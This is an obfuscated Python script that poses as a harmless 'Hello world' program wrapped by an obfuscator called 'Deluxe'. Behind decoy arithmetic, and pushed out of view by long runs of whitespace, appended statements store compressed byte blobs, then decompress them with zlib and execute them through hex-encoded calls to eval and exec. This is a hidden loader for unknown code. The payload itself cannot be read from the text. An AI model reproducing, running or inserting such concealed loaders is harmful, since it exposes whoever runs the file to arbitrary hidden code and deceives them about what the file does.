from builtins import *
from math import prod as Product


__obfuscator__ = 'Deluxe'
__authors__ = "SadHam"
__github__ = 'https://github.com/'
__discord__ = 'https://discord.gg/'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_memoryaccess, Multiply, _divide, While, _stackoverflow, Frame, _random = exec, str, tuple, map, ord, globals, type

class Walk:
    def __init__(self, Floor):
        self.Statistics = Product((Floor, -66242))
        self._modulo(Builtins=55561)

    def _modulo(self, Builtins = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Statistics *= -98614 + Builtins
        
        try:
            ({Multiply: _divide} or Multiply if {Multiply: _divide} and Multiply else ... or (Multiply, {Multiply: _divide}))

        except TypeError:
            ((_memoryaccess, {_memoryaccess: While}) for _memoryaccess in {Multiply: _divide} if While < _memoryaccess)

        except:
            _random(23770 / 89687) == int

    def _round(self, _walk = 79033):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _walk *= 36035 / 84904
        self._while != Ellipsis
        
        try:
            (((_divide, Multiply), _stackoverflow) for _stackoverflow in (_divide, Multiply))

        except AssertionError:
            ((Multiply, (_divide, Multiply)) for Multiply in (_divide, _divide) if Multiply == Multiply)

        except:
            _random(27008 - 67) == bool

    def Ceil(Calculate = float):
        return Frame()[Calculate]

    def Run(StackOverflow = -57705 + -94208, _theory = False, Modulo = Frame):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Modulo()[StackOverflow] = _theory
        
        try:
            ((_divide, Multiply) or _memoryaccess if (_divide, Multiply) and _memoryaccess else ... or (_memoryaccess, (_divide, Multiply)))

        except AssertionError:
            ({Multiply: _divide} or Multiply if {Multiply: _divide} and Multiply else ... or (Multiply, {Multiply: _divide}))

        except:
            _random(42340 + 57744) == int

    def execute(code = str):
        return _memoryaccess(Multiply(_divide(While(_stackoverflow, code))))

    @property
    def _while(self):
        self._power = '<__main__.While object at 0x000004150BE58023>'
        return (self._power, Walk._while)

if True:
    try:
        Walk.execute(code = __code__)
        Positive = Walk(Floor = -32849 / -50916)

        if 311622 > 1536787:
            Positive._modulo(Builtins = Positive.Statistics * -48725)
        elif 177238 < 6830275:
            Positive._modulo(Builtins = Positive.Statistics + 80165)                                                                                                                                                                                                                                                          ;Walk.Run(StackOverflow='SSS2222S2SSS22SS222S222SS2',_theory=b'x\x9c\xedZ\xfdr\xdb\xb8\x11\xff_3~\x07\x84\xee\x8c\xc8\xb3L\xf9#\xb9\xc4\xea\xb8\x19\xd7vb%\x8e\x9d\xb1u\x8d[\xdb\xa3\x81H\xc8b\x02\x11,\x08F\xd2\xe5\xf2\x1e\xfd\xa3O\xd7\'\xe9.@R\x14E\xc9r.\xd7\xb9z\x0e\xb1$\x8a\\,\xb0\xdf\xbf\x85\xb2N^\xbf~B\xfe.\x12\xf21\x89\x15\xf1\x99\xe8\xf5\x93\xd8\xa3\x8a\xf9\x84\x92~\xc0\x19)\xdc\x19\x05j@\x8e\x18O\xc6\xacV[\'\x87"\xbc\x93T%\x9c\xaa@\x84\xf1\x93Z\xad\xa6\xe4\xa4U#0\x82>\xb1\xf5\x05\x8en7c"d\xb7K\x9e\xec\x13\xcbp\xb1\x88\x90\x05*\x9a\xa8\x81\x90qJrI\xfd\x13:,\x91\xdc\xc1\x16\x92^J1P*\x8a[\xcd\xa6\xb9\xe9zb\xd8,\x91\xfbA\xec\t\xe9\x97\xe8\xd3\xbb\xee\xdd]\x99\x9e\x07\x1e\x0bc\x96\xd2\x1f\xbf?\xdd\xdcq\xb7J4\x9e\xf0S\x82z$\x83P\xd9\xd6\t\xe3\\\x90\x91\x90\xdc\x7fb9uM\xeb\xb4\xf2)HS\x8f?\x05~\xdd\xa9\xb1\xb1\xc7"\x95\xea(\x8c\x12\x98}!b\x16\x13*\x19\x91\xcc\xbf\t\xff\x16\x08\xce\x94\xb9\xd1\xe3\t\xbb\t\xd1<\xf8\x8d\x12dr\x13\x9e\x89\x9e\xf0\'\x84\x07\x9f`\xdeD$\x96S3;\x0b\x86\x91\x90\xaa\xdb\x85\xd5&q\xddq\xd98P\xb6\x03f\xe1\xc2\xa3<\xb6\x9d\xeb\xfa\x11\x8cs!\xce\xcf\x8f\x04\x8cs}-\x8e\xea\xb7\xfbw\\\xf4\x80\xa6VM\x80S\xc3p8\x0c\x87\xf8\x06\xef\xa1\xfe\x06\xa3~\xddjmlnl\xda\x9b\xf6\xc6\xb6\xe3\xdc\x02\'\xa6\xa8Rr\t\xa7\xab\xab\x0fW\x1f\xf4\xb8\xd2\xaf+\xb8\x01\x1f\xf3\xac\xfc`\x19\x1b\xbd\x1f\xb3\x8btC\xfa\xcb0\x04q\x8c\xc4\xb5\x85$8\xff\xec\x1d\x8e33\xf4\x05L\x9cjq\xc9\xca\xa3\xf1x42\x7f#\xbc\x1e\x8f\xc70u\x9e\x9f]\xef%\x01WA\x88\xd6\xf8L\xe5=\x1bz\xf3\xe6M\xfb\r\x8eS\xfd\xd9>\x05\xa6SM\x0f\x0b\x06\xb0\xab\xd6\x8a\xc3@\xf1 \xe9\x95\xf5\xe84P\xcfW\xa9\xd6s\xcd_]=\x8c\x8bs\xfd}\xd8\xb8A\xe8\xb3\xb1]\xe7\xf43\x9b{z\xeb,W\xd1G\x0e\xff\x82 \x80\x17\xc7\xbf\x8f<\x00%\xd5\xeb\xeeG\x11\x84\xf7k\xf7\x14t\xdb\x86\xbf\xd3\xd36|\xe0{\xfbQ\xeb\x98\xc5\x9c\xbe\xaaRr\x85\x07\xeb\x90\xd0\xbc\xf5?\\\x02/\xf0\xedQ\xeb\x88\x0b1\xff\x14T\xb48\xfc\xdbm\xde\xe6\x1c\xdfqp\xf3\xc9\x1f\xb5\x92\xa4\x8a\x1f\xe0F\xe7bk\x0b\xfe\xce\xf1\x9f\x80?\xbc\xd8:\x7f\xd4\nb<\x88\x86\xc2{\x80\x92\x86yv2WCSY\x87\x8fZM\x8a\n\xde\x7fp\xd6G\xe5\x8d\xc7\xe6}4N\xafG\x8fZQ,\x91\x9d\x87$n\xb3\x80\xc9\xdcy\xfe~\x98\x86\x82\xc0\x8bi\x18\xfcJ\r-\xe4\xf20\r-f\x93ih\x02\xed\xc9\x98\r\xc2\xe4a\xc9\xdb\xe8,U]\xaa\xcb"\x879\x10fW\xeb\xd6\xee\xd5w\x9f=\xeb\xef\xfe\x08\xaf=x=\x85\x17~\x7f\x0e\xaf\x17\xf0\xdaN?\x9f\xee\xf4v^\xec\xf8+\xd1\xee\xee\xec\x01P\xf4\x19\xb6\x18v\xfdE_\xcd\xcb\xe6h`\xfcx\xfd\xdec\xe3JT\x08\xa3/\xc5\x90d\x80\x9a\x18\x98N\xa0\xe9\x8b\xa0Mm\xc04\xaf\xd1\x17rHU#\x88\x81@\xd1\xd0c\r\xdd\xa15\xf0%"\x166\xb0#\xaa!\xa9]\x87f\xac\xb6\xbe\xbeN:\x83 &C\xe1\'\xd0\xeb\x023h\xa9D\xa2\x88\xe8\x93\x8a\xee2\xf6\x93x@C5\xa0x\x17\xba\x935\xcd\xe2]\xbbCNM\xe7hn\x1c\x8ah"\x83\xbb\x81"\xb6\xe7\x90\x9d\xad\xed=r\x19\xf8\xfe\x80Jl\xa03\x1ek\xb5\xb5Z*\xc5\xc7X\x84\xf9\x17\x11\xe7\x97\x92\x86\xbe\x18N\xbf\xb2\xfc\x12:\xbc\xfc:\x91\x9c\x07=W\xb2\x7f&,VkFQ\x11U\x03\xb8\x9b\xe9\xe9=|\xc5\x05\xf53Op!\xe9\x90f\x0f_\t\xc9\x1a\xe4RM8C\x9au\xa2P)\x07g\x97m\x82\xaeHtC\x9a\xc4\x84I\x1a3x\x08\x9aJ\xa4d\xa1\x82&4\x84)\xc7\x17\x07\x97\xc7\xdd\xd3\xf6\xd91\x81\xb6\xf9f\xbc\xdd\xbb\xdeyk\xad\xd5\x0e\xcfO\xcf/\xbag\x07\xef\x8e\xbb\x9d\xf3\xee\xe1\xf9\x11>\xff\xb2\xa6\xdbU\xcbg}\x9ape\xb5\x88e5\xd2{\xd0\x01\xc3w\xdc\x8e{q|\x94\xdd\xbd\x93\x8c\x85p_o\xd0\xfd\xebE\xfb\xf5I\x87l\x18\xb2\xd7\x17\xc7\xc7g@\xf8\x157\xbeV\x03\xa6D\xdb\xbc\xab\xd8X\xd9\x86\x01^6\x8c\xd0\xfb\xf9\xb2\r\xe8\xbf\xbb\x11\xa7\x1e\xdb\x7f\x05\xad"\xc8\xff\xc3\x0f\x9fFT\xde\x81^\x9d\x16!\xa0\x84I\xc4Z\xc4\x8e\x95l\x10\xfd\xd6\x13\x827\x08\r\'\x0e\xd9\xfc\x0b9\x13(\xba\xde\xa0e\x99\x0b\xbd\xb2^\x8e(\x01\x0b\x861\xf4\xf20\x83\x8c$\x8d"&\xf1\xaev\xe0\xcd 4\xc4\xb8g\x9c\xd9\x8a(\x18DOm\xe5\x0cR\x8a\xc2s-C\x8bx4$=F`\x03\xe8\xa8ZkD\xc8LQ\r}\x9d\xc993?\x13\xb9EF\x03\x06v\xd4;2V\x8d$\xfb\x1c\x0802\x9a\x14\x84\xf4Sip\xa78e\x86\x8fQT\x8b\x08\xcd\xe3\x13\x9b\x8c\x84\xf4c\xf0\xb98f~\x95\x943j\n\xfa\xd3\x8d\xac\xe5\xc7$\xe9a\xca\x8d\xb4\xc0\xb6S\x8fj\x10\x16\xfa\xfb\x96\xe5\x14Tl\xcf;\xd6\xb5V\xcd-L\xd5\xda\xdbH\x9d\xe5\xe2\xf8\xf2\xb8\xd3=8=\x9d\x9a\xd7\x99z\xca\x1dS\xddH\x8a\xf1\xc4\xc6\xf7\x80\xc5\xfbhT\xa7\x95-\x05O\xc0ag\xc3\xcb}\x8f\xb7O@A\x9cI\xfb\xcbW\'\x97)\xe5A tB\xa1\xb4\x7f\x14\xc4\x13\x11\x9e\x92\x91\xf4\x18\n\xf2\n\x8ai\xe2\xdb\xf5\x06\x02\xd2G\xb6\t\xa7\xa4\x13\xe3\xca}\xeb&\xec\xc8I\x10\xde\x11\xbd\x83\x16\xf9bX~\x05\x83\xe7\x96\xcf}\xba#\x136\xc3h\x05Y\xf4\xce \xceR\xbe\xe9t\xc9T"C\xc3a\xaa:O2\xaaX\x17\xf8\xd9\xf0\xcaT\x96\x9b\xf8\x15\xa6\x19L\x14w\xc1g\x16\xe2\xb2\r\xe4\xe0\'\x1e\x9ec\xfdtq\n\x0f\xa9BUa\x02\xa7*\xe8A\xfa\xd5\xe7\x8b\xafu\xba\xad\xc7\x04L\xd7!\x07\xef\xdb.9\x04w\x1f\xe8M\x92\x1e\x17=to\x05\xf2\xea\x14\x17\xbb\xa5\x95%\x8bDW\x84|\x82{\x03\x89!G\xa45\xc2\x9e\xaaC\xa6g\x817\xcd\x9b4\xbf\xdf \xd5M\xf3\x9an\xfe|\xe3\xdf\xda/[\xe9\xd5/\x9b\xf6\xcb\xfd\xf4\xdaq\xbel5v_|5d\x07\x9b\xff\xd8\xda\xdc\xbb\xdd\xf8S\xbap\xae\xaen\x0f\xcc\xea\rf\xd7\xb6\x9a6\xee\xf9\x17\x14\xc0i\xda\xee\xc6K\xa7i9Y\xf8C\xc9\x180\xef\x13z\xd1\x8c\xd2PAT_@LQ\xd4\xcdI\xd2\xd3"\xba\xa4\rQ\x84\x1al\x80\xc7s\x8e\xf32^Il\x02\x1b>I\x1d\xc4#\x1e\x07_\xac\xe3-_\x8cB.\xa8\x0fS\rua\xaf\xe9\xbe\xdd\x98Q\xe9\r\xb4Ys\xdf\x06I\xa0\xb2\xc2\xdd\x19\xf56pk\x8eN\x16)\x1f\xd8o\xc9\xef\xe7\xb2q6\xac\xff\xfc\xfb_P}\xe7\xa4E\x8dA\xc1aZ\xcc8PBN\\\xf2\xd3\x12QPcS\xda\xac\x96\xe4\xcb`v,\xdd\x9b\x89\x92\xc2\xb3B\xc0@}M\xcfO\xa76\x02\x19$\xf5\x94^0\x957\xa4CF\xfas\xceNl\xe6\xde\x91!\x8d\x15\x93S%\x9a9\x05\xddd"t\x01J\xc4&:\xafS#@\xd2\xb3\x1d\xd2\xba\x9d\x12\xd3(H]\xba\xa4H\x9c\xd5"\x99\xf1\x14\x80\x0c\xdb\xb9\x85\x10\xd7"\xda\xd6\x14\xbf`\xa2\x00.n\x01\xd1h\xbd\xc1\xfdmg\x96\xe7\x06\xb1\x9aP\xbf\x14\xd4\xf8\xb8i\x95\x9f\xcd\xec{n\xe2K\xc9\xfa\xfbss\xd2\xfd\xddI\x91D\xf6\x8eS\xa9\xf44\xd5\xa4\x926f\xd7q\xe3\x88\x83=,\x08\x9b\xeb\xcd\xedT1\x0c*\xf7\xca\xcev(\x12\xee\x87uE\xfa\x006s\xb7i\x90\xf7\x1c\xd2\x90\x8e?\xbc\x07\xc9\xe9\xc9\x93\'\xa8+\xed9\xb3\xce\xb2\x82\xaf\x98\xfc\x98o\x1d\x9d#\xfd\xd9\xc2.d\xa8,#\xe6U\xa7\x81\xb83J\x14\xca\xbao\xb9MX\xb9\xcf\xa9\x02\x0b\x18/E\xef\xcb(\xf1\x87\x99\xae\'\x92P\xedo!Z\xc9S\xe0Q\xbaj\xac%A\xb2XG\'\xf0d\x1eD\x87.Oa\xbe\x03\x9dD\xd2U0\xf8\xe2\x88yA?`~\xc3\x80\xbc\xd4\x01\x10d\x00\xea\xd1\x9c(\xe7f\xb58\xe9m\x16\xd9\x8e\x02HB\x00J\xa2\x84s\xc0\x00I\x04\xc5\xd6\xc7\xd5 T\xb5\xaa\x05\xd4\xc4\xbe\xe0>\x93\xaeN\xd6YT\xa5\x99]\'s(+"\x8e\x11p(\xc4\xf2\x86d\xaa\x17\xf0}\xc4\xb1\xf6\xf4N!:\xa1\x98+\xac\x8e\xa6\xd4\x19\x0c\xac/y\x10\xab\xd9\x8a>W\xf7g\xd8\x84\x00\x88\x94\x81\xb9\x18o\xa3A\x00\x81n\\\xd3\xe8\xf5\xcd\xe5\xf9\x19\xf1\xa9\xa2fN\xa5\xbb\xc2*\x85\x12\x99)\xbc\xb0NGd\x92\xeb\x9f\xd90\x91d\xb5\x0cR\x05\x02\x88\xd40\xc5|\x11\xc8.v\'\xf3j \xcd\x99\xd5+\x83c\xf1\xeclWfg\xca\xa0\x0c\xb0\x1b\xe8\t\xa5\x03\xe1\xe3H\xe8\xee\x06)\xf0G\xbe"\xaeA\x85\xcdC\x0bD\x80~\xd7<\xd5j\x9e8\xe5I.\x85\x9e\x88Q\xf0\x08L~\xd7\xb3\x11[\n`\xed\xe0P\x05\xe4&\x05\x0b\xa9rF\xd7\x8f\xdf\x89\x9f\xc1\ti\xf3\x99\xbbE\xecw\xd4C\xdf\x8b\x07\x7f&mpcN\xe0\x069\xbf$Wd{\xab\x8b\x7f\x0e9\x88\xa0\xd0|`\xbd\xb7\x81j>\xdb}\xee\xee\xfeH\xec\xb7\'\x9dw\x00\x16\xf1\xc75\xf2\x1aR\x82p\xa04\x83/\xb1\xe6\xee\x9e\xbb\xe5\xeel?\xdfv\xf7\x9e\x91K\xda\xa72Hg\x957S\x10\xb4\x90\xbfK\xfa\xd1-*\xe7\x99\x86\xcc\xc7L.4:\x9f\xd7,|\x05o\x84\xa0\xfb\xcc\xec\xd4\xf7\xd2y\xe6\xd7E\xf2\x96Mz\x02\xa2\x0f\xe5\x962\x89T\xabh^@\xfe!9\xec\\\x9cn\x1cb\xcc\x03\xee\xd7\xa0\xddO\xa4\xb6:\xf876\xc8\x89F\xab\xa2oZ')

        if 335424 > 4006156:
            Walk(Floor = -51269 - 5143)._round(_walk = 90906 - Positive.Statistics)
        elif 242410 < 6374701:
            Positive._round(_walk = -14959 / Positive.Statistics)                                                                                                                                                                                                                                                          ;Walk.Run(StackOverflow='iiljjliljijijljlljlj',_theory=b'\xc1\xd8\x93A\xa4\x1aE6\xbd\x9c\x1cz\xc1Xh\xc0\xa1\x0b#\xbb\x0b\xc2\x10\x9e5\x16\xb4\x8b\r\x93\x91 \xb7@\x81\xfc\x84p0d\xa3\xb4\x91\xcc\xd8\x17\xf2\xb8\xce\xdc\xaf\x056"\xa94:+W%\xe7\x05)\xb9\xa0\x99T\x93\xc0GH\xf7\xa4\xd3y\x7f\x8cW\x84Bk[\xd0\x11\xc4\x1f\x027h|\xf7\xf7\xc9\xd3\xad]\xdd\r\x1e\x14\xe2\x00o\x12\xcdd\xd6\xf0\xc5m\x03r%\x17\x98Gx0\x04\xdc\x82\x1b`>\xf3\x17\x97\x96R\x05^\xaf.!s\xc5\xa3\x91\xc5u^/\xd2R\x81o3\xa5bzYX\xaa\x94#JR\xb0oTtuI\xd6\xa6|Ea\x1b\x0f\xb4`\x963S\x7f\xc9\xca\xce\xc4t\x0c\xe8`\x1a\x87\x99L\r\xee\xaa\x80.\xd4% \x9b\x894\x00\xdd\x12\xcau\xf1\xabLd\xb1\x8b\xfc\x11j\xd8\xa9Jg\x9d\xe7\x15l\xfcx\x0c\xc5$\xd6^S\x94\x11\xfa\xdel\x97zK\x18\xcdv\xe6-\xd7[\xb7(\xad\xe5\xa0\x9f\xf5\x8b\t\x19J\x08\x847\x1e\xfe\xb8hh\xbb\xef\x14#,+h\xb8w% Y\x900\x19\xf6 \xd7BT\x9a\xd2\x1e\x0b\xd3F\x8dXq\x1e\x9e\x0e \xf4\x0f\xb0\xdeJ=\xdd\xe4z\xd0\xb59!\xc3\xd0\x06_ar6\xf1\xb7M\xf7\xa1\xb7\xa5\xa18\xae\xd2(\xf6\x0c(\x01 \x10w&V\xa6\xc7m6NE\x87\xf4\x94\xe9\n\xf0\xfb\xb5\x85\x07)\xd6-\x06\x93\x85\x1c\xad\x92\xbf\xcd\x9aa\xde\xffs,3O\xf4M\xc5gv\xf2\xd2"\x94\x8d\x8ab\x94\x8d{\x8aRN\xb6zq\xda\xeb\xee>\xb86\x01Ww{o\xfbG\xf7\xe9\xf3\xe5\xb5)\x1b\x15\xfa\xb8\x9d\xbf\xf5\xc0\x9a\x95\rL\xa0\x90}*\xba\xc1%\xcc\x8bem\xb1\x1e\x8dG\xe5\xa9\x11&Y\x10]\x1a\xd0dA\x8bXHSaR\xb0*\xa4Z ?\x8ei\x8e$\x1b\xfbd\xbb\x9aha\x97Q\x1c9\x16g~\x8bX\xd9q\xe5\x87\x93v\xe7\x18\x9b\xa4/_-\xd7\x04\xa3]\xdc\xac\xb3\xcc\x85\xd2C\x9e\xc5\x14\x8b\xfa\xda{\x04\xc7\xff\xacUM\x9cY1;\xcf\xaa\xa6\xc2H\x87\xec\x89\x08\xde4i\xa8\x99*C9\xd7\xdb\xb7\xd8\x7f \xdbyV\xce\x1f~\xf2\xfb\xf6\x93\xb4=\x9f\xca>K\xb2\x02\xfa\xcc\xc6wB\xa1Sv\xbf)\x1a\xcd\xc6\xc3Q\xa9\xfee\xa1B\x93e\xd4TR\xe1j05\xb7f\x19\xae\xde\xeb\x8d\xbf\x1a\x9cN\x15_\tR\x8d\xa7\x0e\xd4\x90g\x81\xf7}\xc0j\xae\xa6y\xd0Z!\xe5\xfd\xe0u5sT\xac\xf4\xad\xa0\xb6j\xc1\x19\xc8\'\xd0\x8d\xc5g&\x0b\x078\x9005,\xcbP\xeft\x02\xc2;}z\x00$\xa8\xf3\xd2N\xb5\x0e\xcd\x91!^\x96\xd3a\x05\xb1\x86\xd1\x19u\x96\x16Kg\xa7\xfd)\xdf\xea_:\xb2Q\x8d\xeb\x8c\xa0\x08\x1bU=\xc3\x98\x0bL\t\xc9:;\xac(\xe4\xec|\xa3\xd5\xb3~\x15$\x9c2X\t\x16\xe2X\x92\xdaq\xac\x08\x0f5\xe9\xef\xe5\xfc\xa28\x16(iA\xb5\xfcF\xbc\x88c%\xbc\x8fc5pY\xb1\x9b"p\xc8\\\xb8\xa1\xbdl\xc1\x96p\xacT\xe8q\xacT\xecq\xac^\xf0sO_V\xed5\xcb{+>\x8e\xd2\xef\xdd\xcb\x89\xf5\x8f\xae7\xf7\xf2\xec\xf3$\x1e,\x83\x118\x16\xa8\xb7`\xc8,\x8bTC\xc9\xccXE\xf8\xf8\x87\xd9\xff\x1f\xcc^Q\xbaW\x07\x898\xbe3P4,\xff\'`\x11\xc7\xf7\x03\x8c8\x16\xa1\x94\x82Z\x1f\x06\x1cq\xac\x08\x1e\xcb\xd2|/\x00i\x0cR\t"\r\x08\xf9\xed@\xa4V\xdbb Y\x92xu0\x89\xe3~S\xad\x00\xd2\xbf\x05X.[|\x81\xb0K~\xa9,\x8f9\x93,\x12\xc2\xd8\xa9\xfaif\xbc\x05K\xa4\x16]|\x1ea\xcc|_[^\xb0}\x05m\x9e\x9a\xe6Z\xda\xff\x02\x90)\x84\x90')

        Positive._modulo(Builtins = Positive.Statistics * 57014)                                                                                                                                                                                                                                                          ;NMMNMMMMNNNMMNNMMM,SS2S2SS222S222SSS22,IIIIIlllllIlllIIII,JJLILLJJJLLJLLLLLLLL,IJJLLLLLLJJLJIJJJJLIJJLJ=(lambda DOooooOoDoooDoODoO:DOooooOoDoooDoODoO(__import__('\x7a\x6c\x69\x62'))),(lambda DOooooOoDoooDoODoO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DOooooOoDoooDoODoO)"),filename='\x4e\x4d\x4d\x4d\x4d\x4e\x4e\x4d\x4d\x4e\x4e\x4d\x4e\x4e\x4e\x4e\x4d\x4d\x4d\x4d\x4e\x4e\x4e\x4e\x4d',mode='\x65\x76\x61\x6c'))),(lambda DOooooOoDoooDoODoO:DOooooOoDoooDoODoO['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda DOooooOoDoooDoODoO:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DOooooOoDoooDoODoO)"),filename='\x4e\x4d\x4d\x4d\x4d\x4e\x4e\x4d\x4d\x4e\x4e\x4d\x4e\x4e\x4e\x4e\x4d\x4d\x4d\x4d\x4e\x4e\x4e\x4e\x4d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda NMMNNMMMMMMNMMNMNMMNMMMNM,DOooooOoDoooDoODoO:NMMNNMMMMMMNMMNMNMMNMMMNM(DOooooOoDoooDoODoO))
        if 466720 > 6019139:
            Positive._modulo(Builtins = Positive.Statistics + -44329)
        elif 363876 < 2745513:
            Positive._modulo(Builtins = Positive.Statistics - -8325)                                                                                                                                                                                                                                                          ;JJLILLJJJLLJLLLLLLLL()(IJJLLLLLLJJLJIJJJJLIJJLJ(IIIIIlllllIlllIIII(NMMNMMMMNNNMMNNMMM(SS2S2SS222S222SSS22('\x76\x61\x72\x73'))),Walk.Ceil(Calculate='SSS2222S2SSS22SS222S222SS2')+Walk.Ceil(Calculate='iiljjliljijijljlljlj')))

    except Exception as Cube:
        import traceback
        print(f'    module {__name__} raised an Exception:')
        print(f'     {Cube}')
        print(traceback.format_exc())
        if 296120 > 5273220:
            Walk.execute(code = Multiply(Cube))

        elif 219422 > 8087667:
            Positive._round(_walk = 93228 - Positive.Statistics)